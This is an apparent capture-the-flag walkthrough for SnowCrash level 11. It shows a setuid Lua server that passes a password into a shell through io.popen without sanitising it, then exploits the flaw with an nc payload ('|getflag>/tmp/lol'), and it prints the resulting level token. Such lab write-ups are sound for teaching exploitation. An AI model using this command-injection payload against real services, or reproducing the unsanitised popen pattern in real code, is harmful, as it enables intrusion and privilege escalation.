# Level 11

- We login as user level11.
```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```


- A lua script has been left to us, let's `cat level11.lua`:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```


- This script defines a TCP server listening on 127.0.0.1 through port 5151. It prompts clients attempting to connect, asking for a password, which is then passed to a hashing function. The hash result is compared, and the server responds accordingly.
```
level12@SnowCrash:~$ netstat -tunlp | grep 5151
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
```


- There is indeed a server listening on 127.0.0.1 through port 5151. What interests us here is the hashing function. This function executes `echo "..pass.." | sha1sum`, then puts the output of this command into the file descriptor assigned to `prog`, so:
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password:|getflag>/tmp/lol
Erf nope..
```

```
level11@SnowCrash:~$ cat /tmp/lol
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

```
level11@SnowCrash:~$ su level12
Password:fa6v5ateaw21peobuub8ipe6s
level12@SnowCrash:~$
```